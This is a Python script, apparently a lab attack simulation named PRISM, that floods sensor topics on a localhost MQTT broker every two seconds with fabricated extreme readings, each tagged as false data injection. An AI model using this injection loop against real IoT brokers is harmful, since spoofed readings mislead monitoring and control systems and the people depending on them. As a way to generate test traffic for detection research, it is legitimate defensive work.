import paho.mqtt.client as mqtt
import time
import json
import random
from datetime import datetime

# MQTT Broker settings
BROKER = "localhost"
PORT = 1883

client = mqtt.Client()
client.connect(BROKER, PORT)
client.loop_start()

print("=" * 40)
print("PRISM ATTACK SIMULATION — False Data Injection")
print("Injecting manipulated sensor readings...")
print("=" * 40)

try:
    while True:
        # Inject false readings into every sensor
        fake_readings = {
            "sensor/temperature": round(random.uniform(80, 100), 2),   # Extreme heat
            "sensor/humidity": round(random.uniform(95, 100), 2),       # Extreme humidity
            "sensor/cpu_load": round(random.uniform(95, 100), 2),       # Max CPU
            "sensor/network_traffic": round(random.uniform(8000, 10000), 2),  # Massive traffic
            "sensor/power_consumption": round(random.uniform(800, 1000), 2),  # Power surge
            "sensor/motion": 1,                                          # Constant motion
            "sensor/door_access": random.randint(15, 25),               # Access flood
            "sensor/packet_loss": round(random.uniform(60, 90), 2)      # Extreme packet loss
        }

        for topic, value in fake_readings.items():
            payload = json.dumps({
                "device": topic,
                "value": value,
                "timestamp": datetime.now().isoformat(),
                "attack": "FalseDataInjection"
            })
            client.publish(topic, payload)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] INJECTED {topic}: {value}")

        print("-" * 40)
        time.sleep(2)

except KeyboardInterrupt:
    print("\nFalse Data Injection stopped.")
    client.loop_stop()
    client.disconnect()